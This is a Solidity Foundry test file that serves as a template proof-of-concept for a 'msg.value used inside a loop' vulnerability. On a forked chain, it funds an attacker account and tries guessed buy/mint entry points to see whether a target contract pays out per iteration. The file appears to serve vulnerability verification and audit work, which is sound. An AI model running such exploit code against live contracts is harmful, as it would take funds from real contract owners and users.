// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- msg.value used inside a loop
/// @notice Detector: msg-value-loop. The target references msg.value inside
///         a loop -- e.g. paying / refunding msg.value PER ITERATION instead
///         of once. One call with n iterations then pays out n x msg.value.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set PRICE, and the iteration count /
///      the per-item price to the target.


contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the per-item price the target charges.
    uint256 public constant PRICE = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// One buy attempt. Success is the caller's NET OUTFLOW being less than one
    /// price — the loop paid msg.value per iteration — never the call returning.
    function _attemptBuy(address buyer, string memory label, bytes memory data) internal returns (string memory) {
        uint256 before = buyer.balance;
        vm.prank(buyer);
        (bool ok,) = target.call{value: PRICE}(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return "";
        uint256 floor_ = before > PRICE ? before - PRICE : 0;
        return buyer.balance > floor_ ? label : "";
    }

    function test_exploit() public {
        require(PRICE > 0, "set PRICE to the per-item price");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        // The entry point is a GUESS on an unverified target: one call paying
        // for ONE item while asking for several. A single wrong name reports
        // "not reproduced" for a vulnerability that exists under another.
        uint256 before = attackerEOA.balance;
        string memory used;
        used = _attemptBuy(attackerEOA, "buy(uint256)", abi.encodeWithSignature("buy(uint256)", uint256(3)));
        if (bytes(used).length == 0) used = _attemptBuy(attackerEOA, "mint(uint256)", abi.encodeWithSignature("mint(uint256)", uint256(3)));
        if (bytes(used).length == 0) used = _attemptBuy(attackerEOA, "purchase(uint256)", abi.encodeWithSignature("purchase(uint256)", uint256(3)));
        if (bytes(used).length == 0) used = _attemptBuy(attackerEOA, "buyItems(uint256)", abi.encodeWithSignature("buyItems(uint256)", uint256(3)));
        if (bytes(used).length == 0) used = _attemptBuy(attackerEOA, "mintMany(uint256)", abi.encodeWithSignature("mintMany(uint256)", uint256(3)));

        console.log("entry point that leaked value:", used);
        console.log("attacker net outflow for 3 items:", before - attackerEOA.balance);
        assertTrue(
            bytes(used).length > 0,
            "no loop entry point leaked per-iteration msg.value. Tried buy(uint256), mint(uint256), purchase(uint256), buyItems(uint256), mintMany(uint256). This does NOT establish safety: the function may be named differently, take other arguments, or reference msg.value only once."
        );
    }
}
